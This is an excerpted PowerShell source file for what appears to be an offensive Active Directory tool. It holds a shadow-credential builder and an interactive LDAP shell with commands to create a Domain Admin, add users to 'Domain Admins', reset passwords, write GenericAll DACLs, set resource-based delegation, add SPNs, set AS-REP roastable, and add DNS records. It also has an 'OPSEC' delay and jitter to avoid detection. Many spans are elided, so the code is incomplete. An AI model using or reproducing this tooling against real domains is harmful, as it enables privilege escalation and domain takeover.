...
. "$_dir\adcs-common-non-domainjoined.ps1"
...
function New-ShadowCredential {
    ...
    $bw.Write([uint32]0x31415352)
    $bw.Write([uint32]($rsaParams.Modulus.Length * 8))
    $bw.Write([uint32]$rsaParams.Exponent.Length)
    $bw.Write([uint32]$rsaParams.Modulus.Length)
    $bw.Write([uint32]0)
    $bw.Write([uint32]0)
...
switch ($Action) {
    ...
    'LdapShell' {
        ...
        Write-Host '    addmember "group" <user>   Add to group (quote names with spaces)' -ForegroundColor Gray
        Write-Host '    delmember "group" <user>   Remove from group' -ForegroundColor Gray
        ...
        Write-Host '    setrbcd "target" "princ"   Set RBCD' -ForegroundColor Gray
        ...
        Write-Host ""
        Write-Host "  Tip: Use double quotes around names with spaces:" -ForegroundColor DarkYellow
        Write-Host '    addmember "Domain Admins" jsmith' -ForegroundColor DarkYellow
        Write-Host '    writedacl "CN=Users,DC=yolo,DC=domain" "Domain Admins" GenericAll' -ForegroundColor DarkYellow
        Write-Host ""
        ...
        #  Supports: "Domain Admins" user  |  'Domain Admins' user
        #            CN=X,DC=y user        |  simpleArg1 simpleArg2
        # ================================================================
        function Parse-ShellArgs {
            <# Splits a shell argument string into tokens, respecting double and
               single quoted segments. Unquoted tokens split on whitespace.
               Examples:
                 '"Domain Admins" domainadmin2'  -> @('Domain Admins', 'domainadmin2')
                 "'My Group' user1"              -> @('My Group', 'user1')
                 'CN=X,DC=y user1'               -> @('CN=X,DC=y', 'user1')
            ...
            while ($i -lt $len) {
                ...
                while ($i -lt $len -and $Line[$i] -match '\s') { $i++ }
                if ($i -ge $len) { break }
                ...
                if ($ch -eq '"') {
                    ...
                    if ($i -lt $len) { $i++ }  # skip closing quote
                    ...
                    $start = $i
                    while ($i -lt $len -and $Line[$i] -notmatch '\s') { $i++ }
                    $tokens.Add($Line.Substring($start, $i - $start))
                }
            }
        ...
        # Helper: resolve group - tries CN match then sAMAccountName
        function Resolve-GroupDN {
            param([string]$Name)
            if ($Name -match ',') { return $Name }
            # Try CN match first (handles "Domain Admins")
            try {
                $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                    $ctx.DomainDN, "(&(objectCategory=group)(cn=$Name))", "Subtree", @("distinguishedName")
                )
                $fReq.SizeLimit = 1
                $fResp = $ldap.SendRequest($fReq)
                if ($fResp.Entries.Count -gt 0) { return $fResp.Entries[0].DistinguishedName }
            } catch {}
            # Fallback to sAMAccountName
            try {
                $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                    $ctx.DomainDN, "(&(objectCategory=group)(sAMAccountName=$Name))", "Subtree", @("distinguishedName")
                )
                $fReq.SizeLimit = 1
                $fResp = $ldap.SendRequest($fReq)
                if ($fResp.Entries.Count -gt 0) { return $fResp.Entries[0].DistinguishedName }
        ...
        while ($true) {
            ...
            # Parse command vs arguments (first unquoted word is always the command)
            ...
            switch ($cmd) {
                'help' {
                    ...
                    Write-Host ""
                    Write-Host '  Tip: Quote names with spaces: addmember "Domain Admins" jsmith' -ForegroundColor DarkYellow
                    continue
                }
                'delay' {
                    if (-not $arg) {
                ...
                'enrollcheck' {
                    ...
                    # (enrollcheck logic is unchanged - omitted for brevity, copy from original)
                    # The $arg here is a single template name, no spaces issue
                    try {
                        ...
                        foreach ($ace in $sd.DiscretionaryAcl) {
                            ...
                            if (($mask -band 0xF01FF) -eq 0xF01FF) { $fullControl += $ntName; continue }
                            if (($mask -band 0x40000) -or ($mask -band 0x80000)) { $dangerousWrite += $ntName }
                            if ($ace -is [System.Security.AccessControl.ObjectAce]) {
                                $og = $ace.ObjectAceType
                                if ($og -eq $enrollGuid) { $enrollers += $ntName }
                                elseif ($og -eq $autoEnrollGuid) { $autoEnrollers += $ntName }
                                elseif ($og -eq [guid]::Empty -and ($mask -band $allExtended)) { $enrollers += "$ntName (AllExtendedRights)" }
                            } elseif ($mask -band $allExtended) { $enrollers += "$ntName (AllExtendedRights)" }
                        }
                        ...
                        if (-not $published) { Write-Host "    (not published on any CA)" -ForegroundColor Yellow }
                        ...
                        $lowPrivCanEnroll = ($enrollers + $fullControl) | Where-Object {
                            $e = $_; $lowPrivNames | Where-Object { $e -match $_ }
                        }
                ...
                'delegations' {
                    try {
                        ...
                        $udReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            ...
                            "Subtree", @("cn", "distinguishedName", "dNSHostName")
                        )
                        $udReq.SizeLimit = 50
                        ...
                        $cdReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(msDS-AllowedToDelegateTo=*)", "Subtree",
                        ...
                        $rbcdReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)", "Subtree",
                            ...
                            if ($e.Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
                                try {
                                    ...
                                    foreach ($ace in $sd.DiscretionaryAcl) {
                                        ...
                                        } catch { Write-Host "      <- $sidStr" -ForegroundColor Gray }
                                    }
                                } catch {}
                            }
                        }
                ...
                'servicemap' {
                    try {
                        $smReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(servicePrincipalName=*)", "Subtree",
                ...
                'acl' {
                    ...
                    $aclTokens = Parse-ShellArgs $arg
                    $aclDN = Resolve-LdapDN $aclTokens[0]
                    if (-not $aclDN) { Write-Host "  [-] Not found: $($aclTokens[0])" -ForegroundColor Red; continue }
                    $aclIdentity = if ($aclTokens.Count -gt 1) { $aclTokens[1] } else { "" }
                    try {
                        $sd = Get-LdapSD $aclDN
                        if (-not $sd) { Write-Host "  [-] Cannot read SD" -ForegroundColor Red; continue }
                ...
                # ================================================================
                #  ACTION COMMANDS (all use Parse-ShellArgs for quoted support)
                # ================================================================

                'adduser' {
                    if (-not $arg) { Write-Host "  Usage: adduser <sAMAccountName> [password]" -ForegroundColor Yellow; continue }
                    $auTokens = Parse-ShellArgs $arg
                    $auName = $auTokens[0]
                    $auPass = if ($auTokens.Count -gt 1) { $auTokens[1] }
                ...
                'addda' {
                    ...
                    $daTokens = Parse-ShellArgs $arg
                    $daName = $daTokens[0]
                    $daPass = if ($daTokens.Count -gt 1) { $daTokens[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    ...
                    try {
                        ...
                        Write-Host '  [i] Try: addmember "Domain Admins" ' + $daName -ForegroundColor Yellow
                    }
                    continue
                }
                'addcomputer' {
                    if (-not $arg) { Write-Host "  Usage: addcomputer <name> [password]" -ForegroundColor Yellow; continue }
                    $acTokens = Parse-ShellArgs $arg
                    $acName = $acTokens[0] -replace '\$$',''
                    $acPass = if ($acTokens.Count -gt 1) { $acTokens[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $acSam = "$acName$"
                ...
                'deluser' {
                    ...
                    $delDN = Resolve-LdapDN $arg
                    if (-not $delDN) { $delDN = $arg }
                ...
                'shadowcred' {
                    ...
                    $scTarget = $arg
                    $scDN = Resolve-LdapDN $scTarget
                    if (-not $scDN) { Write-Host "  [-] Not found: $scTarget" -ForegroundColor Red; continue }
                ...
                'clearcred' {
                    ...
                    $ccDN = Resolve-LdapDN $arg
                    if (-not $ccDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                ...
                'passwd' {
                    ...
                    $passTokens = Parse-ShellArgs $arg
                    $passTarget = $passTokens[0]
                    $passNew = if ($passTokens.Count -gt 1) { $passTokens[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $passDN = Resolve-LdapDN $passTarget
                    if (-not $passDN) { Write-Host "  [-] User not found: $passTarget" -ForegroundColor Red; continue }
                    Write-Host "  [i] Resolved: $passDN" -ForegroundColor Gray
                    $quotedPwd = [System.Text.Encoding]::Unicode.GetBytes("`"$passNew`"")
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $passDN,
                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                        "unicodePwd", $quotedPwd
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                ...
                # ---- addmember / delmember: Parse-ShellArgs handles "Domain Admins" ----
                'addmember' {
                    if (-not $arg) { Write-Host '  Usage: addmember "Group Name" <member>' -ForegroundColor Yellow; continue }
                    $amTokens = Parse-ShellArgs $arg
                    if ($amTokens.Count -lt 2) { Write-Host '  Usage: addmember "Group Name" <member>' -ForegroundColor Yellow; continue }
                    $amGroup = $amTokens[0]; $amMember = $amTokens[1]

                    # Resolve group DN (supports CN with spaces)
                    $amGroupDN = Resolve-GroupDN $amGroup
                    if (-not $amGroupDN) { Write-Host "  [-] Group not found: $amGroup" -ForegroundColor Red; continue }

                    # Resolve member DN
                    $amMemberDN = Resolve-LdapDN $amMember
                    if (-not $amMemberDN) { Write-Host "  [-] Member not found: $amMember" -ForegroundColor Red; continue }
                ...
                'delmember' {
                    if (-not $arg) { Write-Host '  Usage: delmember "Group Name" <member>' -ForegroundColor Yellow; continue }
                    $dmTokens = Parse-ShellArgs $arg
                    if ($dmTokens.Count -lt 2) { Write-Host '  Usage: delmember "Group Name" <member>' -ForegroundColor Yellow; continue }
                    $dmGroup = $dmTokens[0]; $dmMember = $dmTokens[1]

                    $dmGroupDN = Resolve-GroupDN $dmGroup
                    if (-not $dmGroupDN) { Write-Host "  [-] Group not found: $dmGroup" -ForegroundColor Red; continue }

                    $dmMemberDN = Resolve-LdapDN $dmMember
                    if (-not $dmMemberDN) { Write-Host "  [-] Member not found: $dmMember" -ForegroundColor Red; continue }
                ...
                'setrbcd' {
                    if (-not $arg) { Write-Host '  Usage: setrbcd "target" "principal"' -ForegroundColor Yellow; continue }
                    $rbcdTokens = Parse-ShellArgs $arg
                    if ($rbcdTokens.Count -lt 2) { Write-Host '  Usage: setrbcd "target" "principal"' -ForegroundColor Yellow; continue }
                    $rbcdTarget = $rbcdTokens[0]; $rbcdPrinc = $rbcdTokens[1]
                    try {
                ...
                'addspn' {
                    ...
                    $spnTokens = Parse-ShellArgs $arg
                    if ($spnTokens.Count -lt 2) { Write-Host '  Usage: addspn <account> "SPN"' -ForegroundColor Yellow; continue }
                    $spnDN = Resolve-LdapDN $spnTokens[0]
                    if (-not $spnDN) { Write-Host "  [-] Not found: $($spnTokens[0])" -ForegroundColor Red; continue }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $spnDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
                        "servicePrincipalName", $spnTokens[1]
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] SPN added: $($spnTokens[1]) on $spnDN" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'delspn' {
                    ...
                    $spnTokens = Parse-ShellArgs $arg
                    if ($spnTokens.Count -lt 2) { Write-Host '  Usage: delspn <account> "SPN"' -ForegroundColor Yellow; continue }
                    $spnDN = Resolve-LdapDN $spnTokens[0]
                    if (-not $spnDN) { Write-Host "  [-] Not found: $($spnTokens[0])" -ForegroundColor Red; continue }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                    ...
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] SPN removed: $($spnTokens[1])" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'setasrep' {
                ...
                'setowner' {
                    if (-not $arg) { Write-Host '  Usage: setowner "target" "newOwner"' -ForegroundColor Yellow; continue }
                    $soTokens = Parse-ShellArgs $arg
                    if ($soTokens.Count -lt 2) { Write-Host '  Usage: setowner "target" "newOwner"' -ForegroundColor Yellow; continue }
                    $soDN = Resolve-LdapDN $soTokens[0]
                    if (-not $soDN) { Write-Host "  [-] Target not found: $($soTokens[0])" -ForegroundColor Red; continue }
                    $soOwnerDN = Resolve-LdapDN $soTokens[1]
                    if (-not $soOwnerDN) { Write-Host "  [-] Owner not found: $($soTokens[1])" -ForegroundColor Red; continue }
                    ...
                    try {
                        ...
                        Write-Host "  [+] Owner changed to $($soTokens[1]) ($($soSid.Value))" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'writedacl' {
                    if (-not $arg) { Write-Host '  Usage: writedacl "target" "principal" <right>' -ForegroundColor Yellow; continue }
                    $wdTokens = Parse-ShellArgs $arg
                    if ($wdTokens.Count -lt 3) {
                    ...
                    $wdDN = Resolve-LdapDN $wdTokens[0]
                    $wdPrincDN = Resolve-LdapDN $wdTokens[1]
                    ...
                    try {
                        ...
                        Write-Host "  [+] ACE added: $($wdTokens[2]) for $($wdTokens[1]) on $($wdTokens[0])" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'disable' {
                    ...
                    try {
                        $uacReq = New-Object System.DirectoryServices.Protocols.SearchRequest($disDN, "(objectClass=*)", "Base", @("userAccountControl"))
                        $uacResp = $ldap.SendRequest($uacReq)
                        $curUAC = [int]$uacResp.Entries[0].Attributes["userAccountControl"][0]
                        $newUAC = $curUAC -bor 0x2
                        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                ...
                'enable' {
                    ...
                    try {
                        $uacReq = New-Object System.DirectoryServices.Protocols.SearchRequest($enDN, "(objectClass=*)", "Base", @("userAccountControl"))
                        $uacResp = $ldap.SendRequest($uacReq)
                        $curUAC = [int]$uacResp.Entries[0].Attributes["userAccountControl"][0]
                        $newUAC = $curUAC -band (-bnot 0x2)
                        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                ...
                'dnsadd' {
                    ...
                    $dnsTokens = Parse-ShellArgs $arg
                    if ($dnsTokens.Count -lt 2) { Write-Host "  Usage: dnsadd <hostname> <IP>" -ForegroundColor Yellow; continue }
                    $dnsName = $dnsTokens[0]; $dnsIP = $dnsTokens[1]
                    $zone = $ctx.Domain
                    ...
                    try {
                        ...
                        $rBw.Write([uint16]4); $rBw.Write([uint16]1); $rBw.Write([byte]5); $rBw.Write([byte]240)
                        $rBw.Write([uint16]0); $rBw.Write([uint32]1); $rBw.Write([uint32]900)
                        $rBw.Write([uint32]0); $rBw.Write([uint32]0); $rBw.Write($ipBytes)
                        $rBw.Flush()
                ...
                'setattr' {
                    ...
                    $saTokens = Parse-ShellArgs $arg
                    if ($saTokens.Count -lt 3) { Write-Host '  Usage: setattr "DN" <attribute> <value>' -ForegroundColor Yellow; continue }
                    $saDN = $saTokens[0]; $saAttr = $saTokens[1]; $saVal = $saTokens[2]
            ...
            # OPSEC: Apply query delay/jitter
            if ($script:queryDelay -gt 0) {
